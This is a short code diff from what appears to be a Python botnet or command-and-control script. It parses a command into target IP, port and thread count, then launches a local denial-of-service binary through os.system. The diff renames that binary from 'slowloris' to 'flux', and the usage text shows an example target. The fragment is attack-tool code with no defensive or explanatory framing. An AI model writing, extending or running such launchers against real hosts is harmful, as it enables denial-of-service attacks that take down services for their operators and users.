@@ -247,7 +247,7 @@ def main():
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 thread = cnc.split()[3]
-                os.system(f'./slowloris {ip} {port} {thread} 0')
+                os.system(f'./flux {ip} {port} {thread} 0')
             except IndexError:
                 print('Usage: flux <ip> <port> <threads>')
                 print('Example: flux 1.1.1.1 80 250')
